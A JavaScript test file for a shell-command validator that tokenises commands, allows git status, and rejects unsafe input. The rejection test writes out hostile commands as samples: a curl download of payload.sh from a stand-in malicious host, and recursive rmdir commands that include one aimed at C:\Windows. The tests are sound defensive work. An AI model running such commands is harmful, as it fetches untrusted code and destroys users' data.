import test from 'node:test';
import assert from 'node:assert/strict';
import { ByoxShellAstValidator } from '../system/byox-shell-ast-validator.js';

test('ByoxShellAstValidator: tokenization with quotes, spaces, and flags', () => {
  const validator = new ByoxShellAstValidator();
  const cmd = 'git commit -m "feat(voice): add neural vad" --author=\'Ayaan Raza\'';

  const tokens = validator.tokenize(cmd);
  assert.equal(tokens[0], 'git');
  assert.equal(tokens[1], 'commit');
  assert.equal(tokens[2], '-m');
  assert.equal(tokens[3], 'feat(voice): add neural vad');
  assert.equal(tokens[4], '--author=Ayaan Raza');
});

test('ByoxShellAstValidator: allowlisted commands validate successfully', () => {
  const validator = new ByoxShellAstValidator();
  const valid = validator.validateCommand('git status --short');

  assert.equal(valid.allowed, true);
  assert.equal(valid.commands[0].executable, 'git');
  assert.deepEqual(valid.commands[0].args, ['status', '--short']);
});

test('ByoxShellAstValidator: disallow unapproved binaries and chaining operators', () => {
  const validator = new ByoxShellAstValidator();

  // Disallowed binary
  const res1 = validator.validateCommand('curl http://malicious.site/payload.sh');
  assert.equal(res1.allowed, false);
  assert.equal(res1.reason, 'DISALLOWED_BINARY');

  // Forbidden shell chaining
  const res2 = validator.validateCommand('git status && rmdir /s /q test');
  assert.equal(res2.allowed, false);
  assert.equal(res2.reason, 'PARSE_ERROR');
  assert.ok(res2.error.includes('chaining operator'));

  // Destructive command pattern
  const res3 = validator.validateCommand('dir rmdir /s C:\\Windows');
  assert.equal(res3.allowed, false);
  assert.equal(res3.reason, 'DESTRUCTIVE_PATTERN_DETECTED');
});
